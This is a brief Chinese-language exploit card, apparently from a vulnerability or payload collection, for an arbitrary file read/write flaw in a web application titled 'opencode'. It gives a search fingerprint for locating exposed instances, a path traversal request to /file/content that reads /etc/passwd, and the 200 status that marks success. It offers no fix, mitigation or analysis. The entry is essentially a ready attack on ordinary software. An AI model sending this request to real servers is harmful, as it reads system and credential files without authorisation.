# OpenCodecontent任意文件读取漏洞

OpenCodecontent ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="opencode"`
- **请求**：`GET /file/content?path=../../../../etc/passwd HTTP/1.1`
- **响应特征**：200